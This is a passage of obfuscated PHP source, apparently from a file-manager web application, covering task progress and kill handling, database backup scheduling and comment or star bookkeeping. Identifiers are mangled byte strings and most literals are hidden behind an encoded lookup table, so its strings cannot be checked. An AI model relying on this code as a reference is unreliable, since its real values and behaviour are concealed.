Hook::unbind($¯›™Ş­ˆ[1870], array($this, $¯›™Ş­ˆ[1925])); Hook::unbind($¯›™Ş­ˆ[1926], array($this, $¯›™Ş­ˆ[1927])); $this->endAfter(); $­æƒö„Î = $this->task; $this->task = !1; Hook::trigger($¯›™Ş­ˆ[1932], $­æƒö„Î); } public function update($¦…÷å¬Á = 0, $åĞµ¶È‹ = false) { $ˆÙíÈ¤ù =& $_SERVER[¿ÈˆÑ¸ä]; $¡À î·æ =& $this->task; if (!$¡À î·æ) { return; } $¡À î·æ[$ˆÙíÈ¤ù[1916]] += $¦…÷å¬Á; $¡À î·æ[$ˆÙíÈ¤ù[1920]] = timeFloat(); if ($¡À î·æ[$ˆÙíÈ¤ù[1165]]) { if ($¡À î·æ[$ˆÙíÈ¤ù[1165]] < $¡À î·æ[$ˆÙíÈ¤ù[1916]]) { $¡À î·æ[$ˆÙíÈ¤ù[1165]] = $¡À î·æ[$ˆÙíÈ¤ù[1916]]; } $ïØˆğ“ = timeFloat() - $¡À î·æ[$ˆÙíÈ¤ù[1919]] - $¡À î·æ[$ˆÙíÈ¤ù[1922]]; if ($ïØˆğ“ <= 0) { $ïØˆğ“ = 0.001; } $¡À î·æ[$ˆÙíÈ¤ù[1917]] = $¡À î·æ[$ˆÙíÈ¤ù[1916]] / $¡À î·æ[$ˆÙíÈ¤ù[1165]]; $¡À î·æ[$ˆÙíÈ¤ù[1918]] = $¡À î·æ[$ˆÙíÈ¤ù[1916]] / $ïØˆğ“; if ($¡À î·æ[$ˆÙíÈ¤ù[1917]] > 0) { $¡À î·æ[$ˆÙíÈ¤ù[1923]] = $ïØˆğ“ * (1 - $¡À î·æ[$ˆÙíÈ¤ù[1917]]) / $¡À î·æ[$ˆÙíÈ¤ù[1917]]; } $¡À î·æ[$ˆÙíÈ¤ù[1923]] = $¡À î·æ[$ˆÙíÈ¤ù[1923]] <= 0 ? 0 : $¡À î·æ[$ˆÙíÈ¤ù[1923]]; } $this->updateAfter(); $áäŠÀã = 0.2; if (timeFloat() - $¡À î·æ[$ˆÙíÈ¤ù[1921]] < $áäŠÀã && !$åĞµ¶È‹) { return; } $È¨Ü´¢Ä = self::get($¡À î·æ[$ˆÙíÈ¤ù[483]]); $µ’ß”Ã½ = $È¨Ü´¢Ä[$ˆÙíÈ¤ù[833]]; if ($µ’ß”Ã½ == self::STATYS_KILL) { $¶Ì¡°‹‹ = array($ˆÙíÈ¤ù[1933] => LNG($ˆÙíÈ¤ù[1934]), $ˆÙíÈ¤ù[1336] => !1); Cache::set($ˆÙíÈ¤ù[1935] . $this->task[$ˆÙíÈ¤ù[483]], $¶Ì¡°‹‹, 30); $this->onKill(); $this->end(); die; } else { if ($µ’ß”Ã½ == self::STATYS_STOP) { $‡½—óÕÓ = 2; $È¨Ü´¢Ä[$ˆÙíÈ¤ù[1922]] += $‡½—óÕÓ; self::valueSet($¡À î·æ[$ˆÙíÈ¤ù[483]], $È¨Ü´¢Ä); sleep($‡½—óÕÓ); $this->update(); return; } } $¡À î·æ[$ˆÙíÈ¤ù[833]] = $µ’ß”Ã½ ? $µ’ß”Ã½ : $¡À î·æ[$ˆÙíÈ¤ù[833]]; $¡À î·æ[$ˆÙíÈ¤ù[1922]] = $È¨Ü´¢Ä[$ˆÙíÈ¤ù[1922]] ? $È¨Ü´¢Ä[$ˆÙíÈ¤ù[1922]] : 0; $¡À î·æ[$ˆÙíÈ¤ù[1921]] = timeFloat(); Hook::trigger($ˆÙíÈ¤ù[1936], $¡À î·æ); self::valueSet($¡À î·æ[$ˆÙíÈ¤ù[483]], $¡À î·æ); } public function onKillSet($Ò¶²ƒÚ, $ãŞ¸¤«ø = array()) { $this->onKillCall = array($Ò¶²ƒÚ, $ãŞ¸¤«ø); } public function onKill() { $Ç¹ñğ¶ =& $_SERVER[¿ÈˆÑ¸ä]; self::log($Ç¹ñğ¶[1929] . $this->task[$Ç¹ñğ¶[483]] . $Ç¹ñğ¶[1937]); Hook::trigger($Ç¹ñğ¶[1938], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($’à“—ó˜) { $ò ¼¾Ûß =& $_SERVER[¿ÈˆÑ¸ä]; Cache::set($ò ¼¾Ûß[1935] . $this->task[$ò ¼¾Ûß[483]], $’à“—ó˜, 60); if (!is_array($’à“—ó˜) || !$’à“—ó˜[$ò ¼¾Ûß[1336]]) { self::log($ò ¼¾Ûß[1939] . json_encode($’à“—ó˜)); } return $’à“—ó˜; } public static function get($ıâĞ·Ô) { $–·ó¬µ‹ =& $_SERVER[¿ÈˆÑ¸ä]; $¹ÁÚ·Ò = self::valueGet($ıâĞ·Ô); if (is_array($¹ÁÚ·Ò) && $¹ÁÚ·Ò[$–·ó¬µ‹[1940]]) { $¾â—Ó¹ï = ActionApply($¹ÁÚ·Ò[$–·ó¬µ‹[1940]], array($¹ÁÚ·Ò)); $¹ÁÚ·Ò = is_array($¾â—Ó¹ï) ? $¾â—Ó¹ï : $¹ÁÚ·Ò; } return $¹ÁÚ·Ò; } public static function listData() { $–à«×‰Ê = self::valueGet(); return array_sort_by($–à«×‰Ê, $_SERVER[¿ÈˆÑ¸ä][1919], !0); } public static function kill($»û½‚ğÛ) { return self::changeStatus($»û½‚ğÛ, self::STATYS_KILL); } public static function stop($æ‹½ŠÎÆ) { return self::changeStatus($æ‹½ŠÎÆ, self::STATYS_STOP); } public static function restart($ĞÆ©ğ±¨) { return self::changeStatus($ĞÆ©ğ±¨, self::STATYS_RUNNING); } public static function killAll() { $öµË¶õ† =& $_SERVER[¿ÈˆÑ¸ä]; $ı´¬«×È = self::listData(); foreach ($ı´¬«×È as $‡½±ìØÌ) { self::kill($‡½±ìØÌ[$öµË¶õ†[483]]); } sleep(2); foreach ($ı´¬«×È as $‡½±ìØÌ) { self::valueSet($‡½±ìØÌ[$öµË¶õ†[483]], !1); } } private static function changeStatus($ñ£ÍÉïé, $ûöŠİÂ) { $´Û“ë =& $_SERVER[¿ÈˆÑ¸ä]; $ñ´¯¥Ÿá = self::valueGet($ñ£ÍÉïé); if (!$ñ´¯¥Ÿá) { return !1; } $ñ´¯¥Ÿá[$´Û“ë[833]] = $ûöŠİÂ; self::valueSet($ñ£ÍÉïé, $ñ´¯¥Ÿá); self::log($´Û“ë[1941] . $ñ´¯¥Ÿá[$´Û“ë[483]] . $´Û“ë[1942] . $ûöŠİÂ); return !0; } public static function valueGet($ª°³Ÿ = false) { $Á— ƒ÷ı =& $_SERVER[¿ÈˆÑ¸ä]; if ($ª°³Ÿ) { $Ï‹ËúÀÛ = Model($Á— ƒ÷ı[530])->where(array($Á— ƒ÷ı[95] => $ª°³Ÿ, $Á— ƒ÷ı[33] => $Á— ƒ÷ı[1174]))->find(); return $Ï‹ËúÀÛ ? json_decode($Ï‹ËúÀÛ[$Á— ƒ÷ı[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ûå™ĞÒ = false) { $Ê¦½Æó =& $_SERVER[¿ÈˆÑ¸ä]; $ªíòÂ×¤ = array($Ê¦½Æó[33] => $Ê¦½Æó[1174]); if ($Ûå™ĞÒ) { $ªíòÂ×¤[$Ê¦½Æó[1529]] = $Ûå™ĞÒ; } $­â¦Û¼ò = Model($Ê¦½Æó[530])->where($ªíòÂ×¤)->select(); $­â¦Û¼ò = $­â¦Û¼ò ? $­â¦Û¼ò : array(); foreach ($­â¦Û¼ò as $’‹©çß => $‚€õ’¡Ÿ) { $­â¦Û¼ò[$’‹©çß] = json_decode($‚€õ’¡Ÿ[$Ê¦½Æó[451]], !0); } return $­â¦Û¼ò; } public static function valueSet($¾¤¡ÄØ, $€ËÓÇ®Š) { $¸ı×¤Şï =& $_SERVER[¿ÈˆÑ¸ä]; if (!$€ËÓÇ®Š) { return Model($¸ı×¤Şï[530])->where(array($¸ı×¤Şï[95] => $¾¤¡ÄØ, $¸ı×¤Şï[33] => $¸ı×¤Şï[1174]))->delete(); } $°é·• ¯ = json_encode($€ËÓÇ®Š); if (!$°é·• ¯) { ob_start(); var_dump($€ËÓÇ®Š); $•ËáñÈª = ob_get_clean(); self::log($¸ı×¤Şï[1943] . json_encode_force($•ËáñÈª)); } if (!$¾¤¡ÄØ || !$€ËÓÇ®Š[$¸ı×¤Şï[483]]) { return !1; } $Ì¸½ñ’¯ = array($¸ı×¤Şï[33] => $¸ı×¤Şï[1174], $¸ı×¤Şï[1529] => USER_ID, $¸ı×¤Şï[95] => $¾¤¡ÄØ, $¸ı×¤Şï[451] => $°é·• ¯); $İğÇ‰½ = $¸ı×¤Şï[1944]; CacheLock::lock($İğÇ‰½); Model($¸ı×¤Şï[530])->add($Ì¸½ñ’¯, array(), !0); CacheLock::unlock($İğÇ‰½); } public static function log($¸ŞÖìÕ±) { if (!GLOBAL_DEBUG) { return; } write_log($¸ŞÖìÕ±, $_SERVER[¿ÈˆÑ¸ä][1945]); } } goto fäÅŞ©ƒºÓ; D÷”×Êğ: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\142\141\x63\153\165\x70\114\x69\x73\x74"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\163\164\x61\164\x75\163", "\x63\x6f\x6e\164\145\156\164", "\155\x61\156\165\x61\x6c", "\162\x65\163\x75\x6c\164", "\x74\151\155\x65\x46\162\x6f\x6d", "\x74\151\155\x65\124\157"); public function config() { $È¦–“ç¯ =& $_SERVER[¿ÈˆÑ¸ä]; Action($È¦–“ç¯[2145])->taskInit(); $ïÙŞËÉ  = Model($È¦–“ç¯[856])->get($È¦–“ç¯[863]); $ïÙŞËÉ  = json_decode($ïÙŞËÉ , !0); $ïÙŞËÉ  = is_array($ïÙŞËÉ ) ? $ïÙŞËÉ  : array(); $this->parseContent($ïÙŞËÉ ); unset($ïÙŞËÉ [$È¦–“ç¯[1886]]); Model($È¦–“ç¯[1885])->cacheClear(); $ª€‰Ã«õ = $È¦–“ç¯[2146]; $˜Ğ‰­ = Model($È¦–“ç¯[2147])->findByKey($È¦–“ç¯[1500], $ª€‰Ã«õ); if (!$˜Ğ‰­) { $˜Ğ‰­ = array(); } if (isset($˜Ğ‰­[$È¦–“ç¯[205]])) { $˜Ğ‰­[$È¦–“ç¯[205]] = json_decode($˜Ğ‰­[$È¦–“ç¯[205]], !0); } if (isset($ïÙŞËÉ [$È¦–“ç¯[205]])) { $˜Ğ‰­[$È¦–“ç¯[205]][$È¦–“ç¯[1889]] = $ïÙŞËÉ [$È¦–“ç¯[205]]; unset($ïÙŞËÉ [$È¦–“ç¯[205]]); } return array_merge($˜Ğ‰­, $ïÙŞËÉ ); } public function listData($«í·ß¨Ğ = false, $æó–Ç‰— = "\x6d\157\x64\x69\x66\x79\124\x69\155\145", $¯¦©¶œÑ = false) { $ùÑóığ¡ = parent::listData($«í·ß¨Ğ, $æó–Ç‰—, !0); if (!$ùÑóığ¡) { return $ùÑóığ¡; } if ($«í·ß¨Ğ) { $ùÑóığ¡ = array($ùÑóığ¡); } foreach ($ùÑóığ¡ as &$˜ÚßŞĞÈ) { $this->parseContent($˜ÚßŞĞÈ); } return $«í·ß¨Ğ ? $ùÑóığ¡[0] : $ùÑóığ¡; } public function parseContent(&$Œå÷›¯Š) { $Ş‹æÃÄ =& $_SERVER[¿ÈˆÑ¸ä]; $¸©é¨ûá = _get($Œå÷›¯Š, $Ş‹æÃÄ[169], $Ş‹æÃÄ[91]); if (!in_array($¸©é¨ûá, array($Ş‹æÃÄ[862], $Ş‹æÃÄ[1241]))) { $Œå÷›¯Š[$Ş‹æÃÄ[169]] = $¸©é¨ûá == $Ş‹æÃÄ[91] ? $Ş‹æÃÄ[1241] : $Ş‹æÃÄ[862]; } } public function lastItem() { $Û´¾ßÖŸ = $this->listData(); return !empty($Û´¾ßÖŸ[0]) ? $Û´¾ßÖŸ[0] : null; } public function kill($Ìä¯Ø¿Ü) { $û±¡Ù˜ =& $_SERVER[¿ÈˆÑ¸ä]; $«Ì¥Î©Î = $this->listData($Ìä¯Ø¿Ü); if (!$«Ì¥Î©Î || empty($«Ì¥Î©Î[$û±¡Ù˜[32]])) { return !0; } Task::kill($û±¡Ù˜[871]); Task::kill($û±¡Ù˜[892]); Task::kill($û±¡Ù˜[900]); $ô–ÊÓÄĞ = $«Ì¥Î©Î[$û±¡Ù˜[32]]; $îµë±¥ = TEMP_FILES . $û±¡Ù˜[866] . $ô–ÊÓÄĞ . $û±¡Ù˜[8]; IO::remove($îµë±¥, !1); return $this->remove($Ìä¯Ø¿Ü); } public function remove($€§µÈ¯î) { $ ù ­«» = $this->listData($€§µÈ¯î); if (!$ ù ­«») { return !0; } return $this->backupRemove($ ù ­«»); } private function backupRemove($¹µªƒëâ) { parent::remove($¹µªƒëâ[$_SERVER[¿ÈˆÑ¸ä][483]]); $ŒÏ‚ËÔ° = $this->backupPath($¹µªƒëâ); IO::remove($ŒÏ‚ËÔ°, !1); return !0; } private function backupPath($æ³“Ğì) { $²Íá¶àˆ =& $_SERVER[¿ÈˆÑ¸ä]; $áó¥íì = $æ³“Ğì[$²Íá¶àˆ[32]]; $¬„‹›§ = Model($²Íá¶àˆ[856])->get($²Íá¶àˆ[857]); $šß‹—ó— = substr(md5($²Íá¶àˆ[858] . $¬„‹›§ . $áó¥íì), 0, 8); return "\x7b\x69\157\72{$æ³“Ğì[$²Íá¶àˆ[835]]}\175\x2f\x64\141\164\141\x62\x61\163\x65\57\x62\141\143\x6b\165\160\57" . $áó¥íì . $²Íá¶àˆ[11] . $šß‹—ó—; } public function start() { $ù«Æª½‰ =& $_SERVER[¿ÈˆÑ¸ä]; if ($GLOBALS[$ù«Æª½‰[6]][$ù«Æª½‰[92]][$ù«Æª½‰[2148]] != $ù«Æª½‰[91]) { return !0; } $ò˜ÕÍ÷© = $this->config(); if (!$ò˜ÕÍ÷© || $ò˜ÕÍ÷©[$ù«Æª½‰[1886]] != $ù«Æª½‰[91]) { return !1; } if ($ò˜ÕÍ÷©[$ù«Æª½‰[169]] == $ù«Æª½‰[862]) { $¬Ã×ïÄ‘ = Model($ù«Æª½‰[856])->get($ù«Æª½‰[1363]); if ($¬Ã×ïÄ‘ == $ù«Æª½‰[1364]) { $ò˜ÕÍ÷©[$ù«Æª½‰[169]] = $ù«Æª½‰[1241]; } } $ïŠÀ´¢¥ = $this->process(); foreach ($ïŠÀ´¢¥ as $É‹ Ç÷ ) { if ($É‹ Ç÷ ) { return Task::restart($É‹ Ç÷ [$ù«Æª½‰[483]]); } } $è²¡ï¬À = new Backup(); $Ò»—ô¦ = $è²¡ï¬À->db(); if ($Ò»—ô¦) { $Ò»—ô¦ = $è²¡ï¬À->dbFile(); if ($Ò»—ô¦ && $ò˜ÕÍ÷©[$ù«Æª½‰[169]] == $ù«Æª½‰[862]) { $Ò»—ô¦ = $è²¡ï¬À->file(); } } Backup::set(array($ù«Æª½‰[833] => 1, $ù«Æª½‰[845] => time())); return !0; } public function process() { $³˜‚òÏ =& $_SERVER[¿ÈˆÑ¸ä]; $¦Ê”Âã = array($³˜‚òÏ[841] => Task::get($³˜‚òÏ[871]), $³˜‚òÏ[846] => Task::get($³˜‚òÏ[892]), $³˜‚òÏ[231] => Task::get($³˜‚òÏ[900])); $ÉµáÓì’ = !1; foreach ($¦Ê”Âã as &$Ã‹òŒ†å) { if ($ÉµáÓì’) { $Ã‹òŒ†å = !1; continue; } if ($Ã‹òŒ†å) { $Ğ¯ÖŠ¿ = intval(_get($Ã‹òŒ†å, $³˜‚òÏ[1920], 0)); if (time() - $Ğ¯ÖŠ¿ > 7200) { Task::kill($Ã‹òŒ†å[$³˜‚òÏ[483]]); $ÉµáÓì’ = !0; $Ã‹òŒ†å = !1; } } } return $¦Ê”Âã; } public function restore() { $–ö¥™» =& $_SERVER[¿ÈˆÑ¸ä]; ActionCall($–ö¥™»[2149], !0, 1); ActionCall($–ö¥™»[2149], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\x65" => "\143\x6f\155\155\145\x6e\164\x5f\155\145\x74\141", "\x6d\x65\164\141\x46\x69\x65\x6c\144" => "\x63\157\x6d\x6d\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÇŞŠ‰û¶) { $¥øó¸ÒÓ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ÇŞŠ‰û¶[$¥øó¸ÒÓ[2150]]) { $øçÃû»‘ = $this->where(array($¥øó¸ÒÓ[2151] => $ÇŞŠ‰û¶[$¥øó¸ÒÓ[2150]]))->find(); if (!$øçÃû»‘ || $øçÃû»‘[$¥øó¸ÒÓ[189]] != $ÇŞŠ‰û¶[$¥øó¸ÒÓ[189]] || $øçÃû»‘[$¥øó¸ÒÓ[585]] != $ÇŞŠ‰û¶[$¥øó¸ÒÓ[585]]) { return !1; } $this->where(array($¥øó¸ÒÓ[2151] => $ÇŞŠ‰û¶[$¥øó¸ÒÓ[2150]]))->setAdd($¥øó¸ÒÓ[2152], 1); } $ÇŞŠ‰û¶[$¥øó¸ÒÓ[2153]] = 0; $ÇŞŠ‰û¶[$¥øó¸ÒÓ[2152]] = 0; $ÇŞŠ‰û¶[$¥øó¸ÒÓ[833]] = 1; return $this->add($ÇŞŠ‰û¶); } public function commentCount($½¿™×âï, $¨ú™Í’Ò, $Ÿş‡Ö¿î = false) { $¿è¾Ô¨Á =& $_SERVER[¿ÈˆÑ¸ä]; if (!$½¿™×âï) { return array(); } if (is_string($½¿™×âï) || is_int($½¿™×âï)) { $½¿™×âï = array($½¿™×âï); } $„±ÑŒÜ = array($¿è¾Ô¨Á[585], $¿è¾Ô¨Á[2154] => $¿è¾Ô¨Á[581]); $³³³Ğç = array($¿è¾Ô¨Á[585] => array($¿è¾Ô¨Á[7], $½¿™×âï), $¿è¾Ô¨Á[189] => $¨ú™Í’Ò); if ($Ÿş‡Ö¿î) { $³³³Ğç[$¿è¾Ô¨Á[1529]] = $Ÿş‡Ö¿î; } $€ºáç€ = $this->field($„±ÑŒÜ)->where($³³³Ğç)->group($¿è¾Ô¨Á[585])->select(); return array_to_keyvalue($€ºáç€, $¿è¾Ô¨Á[585], $¿è¾Ô¨Á[581]); } public function starTarget($ÃëºËé½, $˜ãï‰ß¨) { $ÙµïÇ× =& $_SERVER[¿ÈˆÑ¸ä]; $³­ò­¾ = $ÃëºËé½ + self::TYPE_STAR_OFFSET; $ïŞÁØµı = array($ÙµïÇ×[1529] => USER_ID, $ÙµïÇ×[189] => $³­ò­¾, $ÙµïÇ×[585] => $˜ãï‰ß¨); $‡·­¸Ä‹ = $this->where($ïŞÁØµı)->find(); if ($‡·­¸Ä‹) { return $this->where(array($ÙµïÇ×[483] => $‡·­¸Ä‹[$ÙµïÇ×[483]]))->delete(); } $ÉÆ‡„»† = array($ÙµïÇ×[2150] => 0, $ÙµïÇ×[1529] => USER_ID, $ÙµïÇ×[833] => 1, $ÙµïÇ×[169] => $ÙµïÇ×[12], $ÙµïÇ×[189] => $³­ò­¾, $ÙµïÇ×[585] => $˜ãï‰ß¨, $ÙµïÇ×[2153] => 0, $ÙµïÇ×[2152] => 0); return $this->add($ÉÆ‡„»†); } public function starTargetCount($ù‚ê¹§­, $Üñ¶Î) { $äîúú’ =& $_SERVER[¿ÈˆÑ¸ä]; $›¯ŒïÎ¤ = $Üñ¶Î + self::TYPE_STAR_OFFSET; $’µàŞ–Û = $this->commentCount($ù‚ê¹§­, $›¯ŒïÎ¤); $¬¸µ‚ = $this->commentCount($ù‚ê¹§­, $›¯ŒïÎ¤, USER_ID); return array($äîúú’[2155] => $’µàŞ–Û, $äîúú’[2156] => $¬¸µ‚); } public function starTargetUserList($ĞÛ÷Ğï¡, $ğ™»˜Ô) { $¡æè¦ê =& $_SERVER[¿ÈˆÑ¸ä]; $ÊËù™²î = $ĞÛ÷Ğï¡ + self::TYPE_STAR_OFFSET; $¼º‰‰”ä = array($¡æè¦ê[585] => $ğ™»˜Ô, $¡æè¦ê[189] => $ÊËù™²î); $áéä˜˜¸ = $this->where($¼º‰‰”ä)->count(); $–Õƒ¦á† = array($¡æè¦ê[333] => $áéä˜˜¸, $¡æè¦ê[2157] => array()); if (!$áéä˜˜¸) { return $–Õƒ¦á†; } $ŞÁ‰Ü†â = $this->field($¡æè¦ê[1529])->where($¼º‰‰”ä)->limit(500)->select(); $ŞÁ‰Ü†â = array_to_keyvalue($ŞÁ‰Ü†â, $¡æè¦ê[12], $¡æè¦ê[1529]); $–Õƒ¦á†[$¡æè¦ê[2157]] = Model($¡æè¦ê[593])->userListInfo($ŞÁ‰Ü†â); return $–Õƒ¦á†; } public function prasiseUserList($ÌæÓ¤àÔ) { $ š‰÷Ù° =& $_SERVER[¿ÈˆÑ¸ä]; $°ËëÅÄ = array($ š‰÷Ù°[2158] => $ÌæÓ¤àÔ); $öŸ•ÓÈØ = $this->where($°ËëÅÄ)->find(); $Ï¤¨Ó© = _get($öŸ•ÓÈØ, $ š‰÷Ù°[2153], 0); $ö´¢”™¹ = array($ š‰÷Ù°[333] => $Ï¤¨Ó©, $ š‰÷Ù°[2157] => array()); if (!$Ï¤¨Ó©) { return $ö´¢”™¹; } $¼²Ê²†Î = Model($ š‰÷Ù°[2159])->field($ š‰÷Ù°[1529])->where($°ËëÅÄ)->limit(500)->select(); $¼²Ê²†Î = array_to_keyvalue($¼²Ê²†Î, $ š‰÷Ù°[12], $ š‰÷Ù°[1529]); $ö´¢”™¹[$ š‰÷Ù°[2157]] = Model($ š‰÷Ù°[593])->userListInfo($¼²Ê²†Î); return $ö´¢”™¹; } public function remove($õ¹éÈœ‘) { $„ìÍ¿Åå =& $_SERVER[¿ÈˆÑ¸ä]; $Ñß™²ÓÁ = array($„ìÍ¿Åå[2151] => $õ¹éÈœ‘); $èµÇÍÈî = $this->where($Ñß™²ÓÁ)->find(); if ($èµÇÍÈî[$„ìÍ¿Åå[2150]]) { $this->where(array($„ìÍ¿Åå[2151] => $èµÇÍÈî[$„ìÍ¿Åå[2150]]))->setAdd($„ìÍ¿Åå[2152], -1); } return $this->removeArray($õ¹éÈœ‘); } public function edit($‰¯øŞğ, $Àä’ğò) { $»†ùøÂ =& $_SERVER[¿ÈˆÑ¸ä]; $œ¹µáÇ = array($»†ùøÂ[2151] => $‰¯øŞğ); return $this->where($œ¹µáÇ)->save(array($»†ùøÂ[2160] => $Àä’ğò)); } public function prasise($ÜÍ«Èış) { $Åî’¤¥Ñ =& $_SERVER[¿ÈˆÑ¸ä]; $Æ™àÕ€ = Model($Åî’¤¥Ñ[2161]); $ÑòÖ‘·’ = array($Åî’¤¥Ñ[2151] => $ÜÍ«Èış, $Åî’¤¥Ñ[1907] => USER_ID); $Ã‘¸Æ‡ç = $Æ™àÕ€->where($ÑòÖ‘·’)->find(); if (!$Ã‘¸Æ‡ç) { $Æ™àÕ€->add($ÑòÖ‘·’); $ùùõ×ƒÚ = $this->where(array($Åî’¤¥Ñ[2151] => $ÜÍ«Èış))->setAdd($Åî’¤¥Ñ[2153], 1); } else { $Æ™àÕ€->where($ÑòÖ‘·’)->delete(); $ùùõ×ƒÚ = $this->where(array($Åî’¤¥Ñ[2151] => $ÜÍ«Èış))->setAdd($Åî’¤¥Ñ[2153], -1); } return $ùùõ×ƒÚ; } public function targetInfo($ñàìù†‘, $¼ÔëğÁÎ) { $®ë™ú¸± =& $_SERVER[¿ÈˆÑ¸ä]; $ÎÔÚµ£ = array($®ë™ú¸±[667] => $ñàìù†‘, $®ë™ú¸±[668] => $¼ÔëğÁÎ); $„ö˜ûäÊ = $this->where($ÎÔÚµ£)->count(); $ÎÃêƒßÓ = "\122\x49\x47\x48\x54\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\x6d\155\145\156\164\x5f\160\162\141\151\x73\145\40\163\x74\x61\x72\x20\x6f\x6e\40\143\157\155\x6d\x65\156\x74\56\143\157\x6d\x6d\x65\156\164\x49\x44\40\75\x20\163\164\x61\162\x2e\143\157\x6d\155\x65\x6e\x74\x49\104"; $ÂËûó = $this->alias($®ë™ú¸±[430])->where($ÎÔÚµ£)->join($ÎÃêƒßÓ, $®ë™ú¸±[2162])->count(); $ëƒ”ú¹ = array($®ë™ú¸±[2163] => $„ö˜ûäÊ, $®ë™ú¸±[2164] => $ÂËûó); return $ëƒ”ú¹; } public function listData($ŞÅì±öß) { $ßßñ„ƒá =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($ŞÅì±öß[$ßßñ„ƒá[2165]])) { if ($ŞÅì±öß[$ßßñ„ƒá[2165]]) { $ŞÅì±öß[$ßßñ„ƒá[2158]] = array($ßßñ„ƒá[1117], intval($ŞÅì±öß[$ßßñ„ƒá[2165]])); } unset($ŞÅì±öß[$ßßñ„ƒá[2165]]); } if (isset($ŞÅì±öß[$ßßñ„ƒá[2166]])) { if ($ŞÅì±öß[$ßßñ„ƒá[2166]]) { $ŞÅì±öß[$ßßñ„ƒá[2158]] = array($ßßñ„ƒá[1114], intval($ŞÅì±öß[$ßßñ„ƒá[2166]])); } unset($ŞÅì±öß[$ßßñ„ƒá[2166]]); } return $this->_listData($ŞÅì±öß); } private function _listData($“ª¢öÇ¨) { $ÄùØ§’Ğ =& $_SERVER[¿ÈˆÑ¸ä]; $‰Âùáò³ = $this->where($“ª¢öÇ¨)->_makeOrder()->selectPage(100); $this->_listAppendParent($‰Âùáò³[$ÄùØ§’Ğ[446]]); $this->_listAppendUser($‰Âùáò³[$ÄùØ§’Ğ[446]]); $this->_listAppendMeta($‰Âùáò³[$ÄùØ§’Ğ[446]]); return $‰Âùáò³; } private function _makeOrder() { $‹•½÷”¶ =& $_SERVER[¿ÈˆÑ¸ä]; $öî·ÄÏ = array($‹•½÷”¶[2153], $‹•½÷”¶[2152], $‹•½÷”¶[232]); $ú­ºìÏ = Input::get($‹•½÷”¶[540], $‹•½÷”¶[7], $‹•½÷”¶[508], $öî·ÄÏ); $õÛ…ëñø = Input::get($‹•½÷”¶[541], $‹•½÷”¶[7], $‹•½÷”¶[1909], array($‹•½÷”¶[2167], $‹•½÷”¶[536])); $±À‰§öå = $ú­ºìÏ . $‹•½÷”¶[53] . $õÛ…ëñø; return $this->order($±À‰§öå); } private function _listAppendParent(&$”µ†ü‹) { $×§Ôá…ğ =& $_SERVER[¿ÈˆÑ¸ä]; $úÜ˜ö´Å = array_unique(array_to_keyvalue($”µ†ü‹, $×§Ôá…ğ[12], $×§Ôá…ğ[2150])); $úÜ˜ö´Å = array_remove_value($úÜ˜ö´Å, $×§Ôá…ğ[229]); if (!$úÜ˜ö´Å) { return; } $ö½ŸõÕ¿ = $this->where(array($×§Ôá…ğ[2151] => array($×§Ôá…ğ[7], $úÜ˜ö´Å)))->select(); $ö½ŸõÕ¿ = array_to_keyvalue($ö½ŸõÕ¿, $×§Ôá…ğ[2158]); foreach ($”µ†ü‹ as &$Áç×€÷«) { if (isset($ö½ŸõÕ¿[$Áç×€÷«[$×§Ôá…ğ[2150]]])) { $Áç×€÷«[$×§Ôá…ğ[2168]] = $ö½ŸõÕ¿[$Áç×€÷«[$×§Ôá…ğ[2150]]]; } } unset($Áç×€÷«); } private function _listAppendUser(&$ë¢·ïæ) { $áœ™ıáü =& $_SERVER[¿ÈˆÑ¸ä]; $Ñ÷“÷ = array_unique(array_to_keyvalue($ë¢·ïæ, $áœ™ıáü[12], $áœ™ıáü[1529])); $Ñ÷“÷ = array_remove_value($Ñ÷“÷, $áœ™ıáü[229]); if (count($Ñ÷“÷) == 0) { return; } foreach ($ë¢·ïæ as $Š’’½¿) { if (isset($Š’’½¿[$áœ™ıáü[2168]])) { $Ñ÷“÷[] = $Š’’½¿[$áœ™ıáü[2168]][$áœ™ıáü[1529]]; } } $ê¦éÑèâ = Model($áœ™ıáü[613])->userListInfo($Ñ÷“÷); foreach ($ë¢·ïæ as &$Š’’½¿) { $Š’’½¿[$áœ™ıáü[681]] = $ê¦éÑèâ[$Š’’½¿[$áœ™ıáü[1529]]]; if (isset($Š’’½¿[$áœ™ıáü[2168]])) { $Š’’½¿[$áœ™ıáü[2168]][$áœ™ıáü[681]] = $ê¦éÑèâ[$Š’’½¿[$áœ™ıáü[2168]][$áœ™ıáü[1529]]]; } } unset($Š’’½¿); } private function _listAppendMeta(&$×ù¬­éº) { $ÈëµÔ‹Ô =& $_SERVER[¿ÈˆÑ¸ä]; $Ã™ğ««ë = array_unique(array_to_keyvalue($×ù¬­éº, $ÈëµÔ‹Ô[12], $ÈëµÔ‹Ô[2158])); $Ã™ğ««ë = array_remove_value($Ã™ğ««ë, $ÈëµÔ‹Ô[229]); if (!$Ã™ğ««ë) { return; } foreach ($×ù¬­éº as $ˆú€ƒİ) { if (isset($ˆú€ƒİ[$ÈëµÔ‹Ô[2168]])) { $Ã™ğ««ë[] = $ˆú€ƒİ[$ÈëµÔ‹Ô[2168]][$ÈëµÔ‹Ô[2158]]; } } $Íİ–ËŞâ = $this->metaList($Ã™ğ««ë); if (!$Íİ–ËŞâ) { return !1; } foreach ($×ù¬­éº as &$ˆú€ƒİ) { $ˆú€ƒİ[$ÈëµÔ‹Ô[551]] = $Íİ–ËŞâ[$ˆú€ƒİ[$ÈëµÔ‹Ô[2158]]]; if 